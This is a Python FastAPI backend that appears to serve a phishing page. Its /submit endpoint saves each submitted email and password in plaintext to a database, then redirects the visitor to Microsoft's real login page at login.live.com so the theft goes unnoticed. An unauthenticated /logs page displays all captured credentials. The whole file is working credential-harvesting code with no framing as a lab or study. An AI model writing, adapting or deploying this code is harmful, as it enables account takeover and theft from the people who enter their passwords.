### main.py (FastAPI Backend)
import os
from fastapi import FastAPI, Form, Request
from fastapi.responses import HTMLResponse, RedirectResponse
from fastapi.middleware.cors import CORSMiddleware
from starlette.staticfiles import StaticFiles
from starlette.templating import Jinja2Templates
from .database import engine, SessionLocal
from .models import Base, LoginAttempt
from datetime import datetime

app = FastAPI()
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

Base.metadata.create_all(bind=engine)

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
FRONTEND_DIR = os.path.join(BASE_DIR, "../frontend")

# app.mount("/static", StaticFiles(directory=FRONTEND_DIR), name="static")
templates = Jinja2Templates(directory=FRONTEND_DIR)


@app.post("/submit")
async def submit(email: str = Form(...), password: str = Form(...)):
    db = SessionLocal()
    try:
        attempt = LoginAttempt(email=email, password=password, timestamp=datetime.now())
        db.add(attempt)
        db.commit()
    finally:
        db.close()
    # Redirect without returning any JSON
    return RedirectResponse(url="https://login.live.com", status_code=302)



@app.get("/", response_class=HTMLResponse)
async def root():
    index_path = os.path.join(FRONTEND_DIR, "index.html")
    with open(index_path, "r") as f:
        return HTMLResponse(content=f.read())

@app.get("/logs", response_class=HTMLResponse)
async def view_logs(request: Request):
    db = SessionLocal()
    attempts = db.query(LoginAttempt).order_by(LoginAttempt.timestamp.desc()).all()
    db.close()
    return templates.TemplateResponse("logs.html", {"request": request, "attempts": attempts})

